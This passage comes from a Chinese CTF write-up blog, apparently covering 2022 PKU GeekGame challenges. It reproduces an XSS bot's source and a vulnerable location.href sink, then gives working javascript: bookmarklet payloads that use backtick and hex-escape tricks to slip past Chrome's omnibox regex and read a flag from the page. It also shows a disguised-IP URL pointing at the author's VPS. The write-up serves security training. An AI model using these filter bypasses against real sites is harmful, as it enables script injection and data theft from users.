operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"202"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"213"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"214"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"221"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"0"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"3"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token comment">//...</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>发现这个一行从 A-&gt;K 是0到10，正好 24 就是第一个纯黑块的地方，于是写个脚本画个图，给这些点上色就好了</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221122040624839.png"></p>
<p>exp:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image
<span class="token keyword">import</span> json

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'flag.json'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    s <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

l <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>
    l<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># print(l)</span>

<span class="token comment"># 2563/11=233.0</span>
img <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">234</span><span class="token punctuation">)</span><span class="token punctuation">,</span> color<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> l<span class="token punctuation">:</span>
    img<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">%</span> <span class="token number">11</span><span class="token punctuation">,</span> i<span class="token operator">//</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
img<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>
img<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'flag.png'</span><span class="token punctuation">)</span>

<span class="token comment"># flag{ThisIsNotSponsoredByTencent}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>没有恰腾讯爸爸的饭，笑死了</p>
<h3 id="给钱不要！"><a href="#给钱不要！" class="headerlink" title="给钱不要！"></a>给钱不要！</h3><blockquote>
<blockquote>
<p>给钱不要，要钱不给，信息不漏！</p>
<p>Give money no need. Need money no give. Information no leak.</p>
</blockquote>
<p>You 酱是 GeekGame 比赛的资深命题人，她深知“人”是信息安全中最薄弱的环节，人的使用习惯胜过一切安全措施。毕竟电脑只要不开机就不会中毒，<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1GJ411x7h7/">链接</a>只要不点就不会被骗。</p>
<p>话虽如此，但她最近沉迷于收集疯狂星期四表情包。身为超级嘿客的你偶然发现她经常使用的表情包下载网站存在一种 XSS 漏洞，只要在网站上输入一串字符就可以泄露她珍藏的 Flag。 为了宝贵的奖金，你决定试试看她在魅力十足的疯狂星期四面前还能否保持理性。</p>
<p>鲁莽的攻击行为总是伴随着风险：如果 You 酱觉得你发给她的字符串很可疑，机智的她就会立刻将你举报到保卫部，然后很快就会有骑着白色高级电瓶车的保安出现在楼下将你带走。这可就遭了。</p>
<p><strong>补充说明：</strong>完全没有思路可以看看 Chrome 地址栏自动补全的相关源码。不看源码的话，或许灵感 + 一定程度的 Fuzz 也能起到效果。</p>
<p><strong>萌新教学：</strong></p>
<p>本题提供了一个模拟受害者行为的程序，称为 XSS Bot。XSS Bot 会自动操作浏览器将 Flag 放置在目标网站上，然后输入你提供的字符串。</p>
<p>请设法利用目标网站上的漏洞，获得受害者浏览器中的 Flag。</p>
<p> 你可以 <a target="_blank" rel="noopener" href="https://prob06-vuln.geekgame.pku.edu.cn/">访问目标网站</a></p>
<p> 你可以 <a target="_blank" rel="noopener" href="https://prob06.geekgame.pku.edu.cn/?token=xxxxxxxxx">打开网页终端</a> 或者通过命令 <code>nc prob06.geekgame.pku.edu.cn 10006</code> 连接到 XSS Bot</p>
<p> 你可以 <a target="_blank" rel="noopener" href="https://geekgame.pku.edu.cn/service/attachment/prob06/prob06-xssbot.py">下载 XSS Bot 源码</a></p>
</blockquote>
<blockquote>
<p><strong>第二阶段提示：</strong></p>
<ul>
<li>来看看 <a target="_blank" rel="noopener" href="https://chromium.googlesource.com/chromium/src/+/refs/tags/106.0.5249.163/components/omnibox/browser/autocomplete_input.cc#235">Chrome 是如何解析地址栏输入的内容的</a>。</li>
<li>Flag 1：试着让 Chrome 把一个任意的 IP 地址解析成 QUERY。</li>
<li>Flag 2：试着让 Chrome 把一个 Bookmarklet 解析成 UNKNOWN。</li>
</ul>
</blockquote>
<h4 id="要钱不给！！"><a href="#要钱不给！！" class="headerlink" title="要钱不给！！"></a>要钱不给！！</h4><p>xss bot:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># pip3 install selenium</span>
<span class="token comment"># you also need a chromedriver according to your chrome version, available at https://chromedriver.chromium.org/downloads</span>

<span class="token keyword">from</span> selenium <span class="token keyword">import</span> webdriver
<span class="token keyword">from</span> enum <span class="token keyword">import</span> Enum
<span class="token keyword">import</span> time

<span class="token keyword">try</span><span class="token punctuation">:</span>
    <span class="token keyword">from</span> flag <span class="token keyword">import</span> getflag
<span class="token keyword">except</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">getflag</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token punctuation">[</span>
            <span class="token string">'fake{congrats, now get flag 1 from the real xss bot}'</span><span class="token punctuation">,</span>
            <span class="token string">'fake{congrats, now get flag 2 from the real xss bot}'</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span><span class="token punctuation">[</span>index<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>

VULN_URL <span class="token operator">=</span> <span class="token string">'http://prob06-vuln.geekgame.pku.edu.cn'</span>

<span class="token keyword">def</span> <span class="token function">remove_protocols</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> prefix <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">'http://'</span><span class="token punctuation">,</span> <span class="token string">'https://'</span><span class="token punctuation">,</span> <span class="token string">'file://'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> t<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> t<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> t

<span class="token keyword">class</span> <span class="token class-name">SafetyLevel</span><span class="token punctuation">(</span>Enum<span class="token punctuation">)</span><span class="token punctuation">:</span>
    dangerous <span class="token operator">=</span> <span class="token number">1</span>
    safe <span class="token operator">=</span> <span class="token number">2</span>
    very_safe <span class="token operator">=</span> <span class="token number">3</span>

<span class="token keyword">def</span> <span class="token function">check_safety</span><span class="token punctuation">(</span>driver<span class="token punctuation">,</span> text<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">'%'</span> <span class="token keyword">in</span> text<span class="token punctuation">:</span>
        <span class="token keyword">return</span> SafetyLevel<span class="token punctuation">.</span>dangerous
    
    text <span class="token operator">=</span> remove_protocols<span class="token punctuation">(</span>text<span class="token punctuation">)</span>
    
    driver<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'chrome://omnibox'</span><span class="token punctuation">)</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">.5</span><span class="token punctuation">)</span>
    
    shadow <span class="token operator">=</span> driver<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">,</span> <span class="token string">'omnibox-input'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>shadow_root
    shadow<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">,</span> <span class="token string">'zero-suggest'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>
    shadow<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">,</span> <span class="token string">'input-text'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span>text<span class="token punctuation">)</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">.5</span><span class="token punctuation">)</span>
    
    result <span class="token operator">=</span> <span class="token punctuation">(</span> <span class="token comment"># it looks stupid that chrome://omnibox uses so many shadow doms :(</span>
        driver
            <span class="token punctuation">.</span>find_element<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">,</span> <span class="token string">'omnibox-output'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>shadow_root
            <span class="token punctuation">.</span>find_element<span class="token punctuation">(</span><span class="token string">'css selector'</span><span class="token punctuation">,</span> <span class="token string">'output-results-group'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>shadow_root
            <span class="token punctuation">.</span>find_element<span class="token punctuation">(</span><span class="token string">'css selector'</span><span class="token punctuation">,</span> <span class="token string">'output-results-details'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>shadow_root
            <span class="token punctuation">.</span>find_element<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">,</span> <span class="token string">'type'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
    <span class="token punctuation">)</span>
    
    <span class="token keyword">if</span> result<span class="token operator">==</span><span class="token string">'query'</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> SafetyLevel<span class="token punctuation">.</span>very_safe
    <span class="token keyword">elif</span> result<span class="token operator">==</span><span class="token string">'unknown'</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> SafetyLevel<span class="token punctuation">.</span>safe
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> SafetyLevel<span class="token punctuation">.</span>dangerous

<span class="token keyword">try</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nYOU-Chan is going to visit a vulnerable website:'</span><span class="token punctuation">,</span> VULN_URL<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'Send some text to YOU-Chan, and she will paste it in that website.'</span><span class="token punctuation">)</span>
    
    text <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'&gt; '</span><span class="token punctuation">)</span>
    <span class="token keyword">assert</span> <span class="token builtin">all</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token operator">&lt;=</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">0x7e</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> text<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">len</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">4000</span>
    
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nStarting up her browser...'</span><span class="token punctuation">)</span>
    
    options <span class="token operator">=</span> webdriver<span class="token punctuation">.</span>ChromeOptions<span class="token punctuation">(</span><span class="token punctuation">)</span>
    options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--no-sandbox'</span><span class="token punctuation">)</span> <span class="token comment"># sandbox not working in docker :(</span>
    options<span class="token punctuation">.</span>add_experimental_option<span class="token punctuation">(</span><span class="token string">'excludeSwitches'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'enable-logging'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token keyword">with</span> webdriver<span class="token punctuation">.</span>Chrome<span class="token punctuation">(</span>options<span class="token operator">=</span>options<span class="token punctuation">)</span> <span class="token keyword">as</span> driver<span class="token punctuation">:</span>
        ua <span class="token operator">=</span> driver<span class="token punctuation">.</span>execute_script<span class="token punctuation">(</span><span class="token string">'return navigator.userAgent'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'She is using:'</span><span class="token punctuation">,</span> ua<span class="token punctuation">)</span>
        
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nFirst of all, she checks the safety of your text,'</span><span class="token punctuation">)</span>
        safety <span class="token operator">=</span> check_safety<span class="token punctuation">(</span>driver<span class="token punctuation">,</span> text<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'  which is %s.'</span><span class="token operator">%</span>safety<span class="token punctuation">.</span>name<span class="token punctuation">)</span>
        
        <span class="token keyword">if</span> safety<span class="token operator">==</span>SafetyLevel<span class="token punctuation">.</span>dangerous<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nShe feels afraid because of this.'</span><span class="token punctuation">)</span>
            <span class="token keyword">assert</span> <span class="token boolean">False</span>
        
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nThen she visits the vulnerable website,'</span><span class="token punctuation">)</span>
        driver<span class="token punctuation">.</span>get<span class="token punctuation">(</span>VULN_URL<span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'  and put her flag for you.'</span><span class="token punctuation">)</span>
        driver<span class="token punctuation">.</span>execute_script<span class="token punctuation">(</span><span class="token string">'document.querySelector(".flag").textContent = "%s"'</span><span class="token operator">%</span>getflag<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nNow she pastes your text into the text field,'</span><span class="token punctuation">)</span>
        driver<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">,</span> <span class="token string">'filename'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>
        driver<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">,</span> <span class="token string">'filename'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span>text<span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">.5</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'  and clicks on the button.'</span><span class="token punctuation">)</span>
        driver<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">,</span> <span class="token string">'go'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
        
        title <span class="token operator">=</span> driver<span class="token punctuation">.</span>title
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nThe page title is:'</span><span class="token punctuation">,</span> title<span class="token punctuation">)</span>
        
        <span class="token keyword">if</span> safety<span class="token operator">==</span>SafetyLevel<span class="token punctuation">.</span>very_safe <span class="token keyword">and</span> title<span class="token operator">==</span><span class="token string">'GIVE-ME-FLAG-1 #=_= @!+!@ ^~^ %[*.*]%'</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'  so here is your flag 1:'</span><span class="token punctuation">,</span> getflag<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\nSee you later :)'</span><span class="token punctuation">)</span>
    
<span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'ERROR'</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token comment">#raise</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>前端：</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221231175527246.png"></p>
<p>页面上这里会把输入的内容直接拼接到 <code>location.href</code> 里，从而造成 XSS</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">go</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    location<span class="token punctuation">.</span>href <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'filename'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">+</span> <span class="token string">'.jpg'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>难点在于需要让 chrome 的地址栏将我们的输入解析为 unknown 甚至是 query </p>
<p>这个的判断用到了 <code>chrome://omnibox</code> 里的这个 type</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221122052020723.png"></p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221122052041306.png"></p>
<p>相关的源码 <a target="_blank" rel="noopener" href="https://chromium.googlesource.com/chromium/src/+/refs/tags/106.0.5249.163/components/omnibox/browser/autocomplete_input.cc#235">在这里</a></p>
<p>IP 地址相关，可以看出如果是不完整的 IP 也会尝试去解析</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221231180853314.png"></p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221231180953125.png"></p>
<p>但是喵喵构造了老半天也弄不出来能让他识别成 QUERY 的 payload……</p>
<p><a target="_blank" rel="noopener" href="https://prob06-vuln.geekgame.pku.edu.cn/how_to_get_flag.jpg">https://prob06-vuln.geekgame.pku.edu.cn/how_to_get_flag.jpg</a></p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221122051432971.png"></p>
<p>看了官方 wp，才知道原来还能点分，但没有完全点分（？？？</p>
<blockquote>
<p>例如，以下所有 URL 都是等价的，不信你就把它输入进 Chrome 试试看：</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://12.34.56.78/">http://12.34.56.78</a>  （点分十进制）</li>
<li><a target="_blank" rel="noopener" href="http://12.34.56.78/">http://0xc.0x22.0x38.0x4e</a>  （点分十六进制）</li>
<li><a target="_blank" rel="noopener" href="http://12.34.56.78/">http://014.042.070.0116</a> （点分八进制）</li>
<li><a target="_blank" rel="noopener" href="http://12.34.56.78/">http://12.0x22.070.78</a> （点分十、十六、八、十进制）</li>
<li><a target="_blank" rel="noopener" href="http://12.34.56.78/">http://203569230</a> （十进制）</li>
<li><a target="_blank" rel="noopener" href="http://12.34.56.78/">http://0xc22384e</a> （十六进制）</li>
<li><a target="_blank" rel="noopener" href="http://12.34.56.78/">http://01410434116</a> （八进制）</li>
<li><a target="_blank" rel="noopener" href="http://12.34.56.78/">http://12.2242638</a> （点分，但没有完全点分）</li>
</ul>
</blockquote>
<p>2242638 也就是 <code>78 + 56*256 + 34*256*256</code></p>
<p>于是可以构造个自己 VPS IP + port 的 payload，比如 </p>
<pre class="line-numbers language-none"><code class="language-none">http://47.2242638:1234?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<!-- http://47.6333594:1234? -->

<p>在 vps 上放个下面内容的页面</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>GIVE-ME-FLAG-1 #=_= @!+!@ ^~^ %[*.*]%<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>miaotony<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后试一试</p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221231182543190.png"></p>
<p>这就能拿到 flag1 了。</p>
<h4 id="信息不漏！！！"><a href="#信息不漏！！！" class="headerlink" title="信息不漏！！！"></a>信息不漏！！！</h4><p>还是围绕对 JavaScript 的特判来看</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// Treat javascript: scheme queries followed by things that are unlikely to</span>
<span class="token comment">// be code as UNKNOWN, rather than script to execute (URL).</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>RE2<span class="token operator">::</span><span class="token function">FullMatch</span><span class="token punctuation">(</span>base<span class="token operator">::</span><span class="token function">UTF16ToUTF8</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"(?i)javascript:([^;=().\"]*)"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> metrics<span class="token operator">::</span>OmniboxInputType<span class="token operator">::</span>UNKNOWN<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>需要满足这个 正则表达式 的输入才能是 UNKNOWN</p>
<p>根据官方 wp，利用反引号可以执行任意函数：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">javascript</span><span class="token operator">:</span>open<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">javascript:alert\x281\x29</span><span class="token template-punctuation string">`</span></span>
<span class="token literal-property property">javascript</span><span class="token operator">:</span>setTimeout<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">alert\x281\x29</span><span class="token template-punctuation string">`</span></span>
<span class="token literal-property property">javascript</span><span class="token operator">:</span>eval<span class="token punctuation">[</span><span class="token string">'call'</span><span class="token punctuation">]</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span><span class="token string">'alert\x281\x29'</span><span class="token interpolation-punctuation punctuation">}</span></span><span class="token template-punctuation string">`</span></span>
<span class="token literal-property property">javascript</span><span class="token operator">:</span>Function<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">alert\x281\x29</span><span class="token template-punctuation string">`</span></span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token template-punctuation string">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>于是可以试试把 title 给设置为页面里的 flag，就能将 flag 带出来了。</p>
<p>构造 payload，前面的反引号构造了个匿名函数，最后的两个反引号应该相当于 <code>()</code> 立即执行的意思</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">javascript</span><span class="token operator">:</span>Function<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">document\x2etitle\x3ddocument\x2equerySelector\x28\x22\x2eflag\x22\x29\x2etextContent</span><span class="token template-punctuation string">`</span></span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token template-punctuation string">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221231184219125.png"></p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221231184235336.png"></p>
<blockquote>
<p>或者还可以利用 <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Bookmarklet">Bookmarklet 的一个鲜为人知的特性</a>：如果 <code>javascript:</code> 后面的内容是一个字符串，它就会被浏览器视为 HTML 解释。也就是说，我们可以直接写成这样：</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">javascript</span><span class="token operator">:</span><span class="token string">'&lt;title&gt;'</span><span class="token operator">+</span>document<span class="token punctuation">[</span><span class="token string">'body'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'textContent'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>它相当于 <code>document.write</code> 后面的内容。</p>
</blockquote>
<p>（学多，您们 js 太会玩了！</p>
<h3 id="这也能卷"><a href="#这也能卷" class="headerlink" title="这也能卷"></a>这也能卷</h3><blockquote>
<blockquote>
<p>某大学的很多课都有作业，特别是程序设计课程，往往会要求同学们写些简单程序当作业。 可惜，现在大家都很卷，考试总能取得极高的分数，甚至大作业也会卷出新花样来。 倘若某人在作业上开摆，那么等待他的往往只能是一个寄字，这也是某大学“摆寄”花名之由来。</p>
</blockquote>
<p>你有一位室友，他的口头禅是“我是摆大最摆的人”和“我从不内卷”。</p>
<p>这一次，他选修了一门叫《JavaScript程序设计》的课程。自从选修这门课程后，你发现他 天天熬到半夜，对着VSCode傻笑，实为异常。</p>
<p>一天，你在偶然间听到了他的喃喃自语：“只要我把小作业当期末作业做，大作业当毕业设计做，势必能卷过其他卷王！” 听到这，感觉收到了欺骗的你勃然大怒，打开了他的第一个“小”作业——一个“简单”的计算器。</p>
<p>另外，通过一顿家园，你获得了他的后端源码，<del>这让这道题的难度大大降低。</del></p>
<p>你可以 <a target="_blank" rel="noopener" href="https://prob09-manager.geekgame.pku.edu.cn/docker-manager/start?xxxxxxx">访问题目网页</a> </p>
<p>你可以 <a target="_blank" rel="noopener" href="https://geekgame.pku.edu.cn/service/attachment/prob09/prob09-src.tar.gz">下载题目源码</a></p>
</blockquote>
<h4 id="Flag-·-摆"><a href="#Flag-·-摆" class="headerlink" title="Flag · 摆"></a>Flag · 摆</h4><p>访问 <code>/premium.html</code>，有个 <code>premium.js</code>，里面是混淆后的代码，其中还有 debugger 卡死调试窗口的</p>
<p>这里直接跳过断点</p>
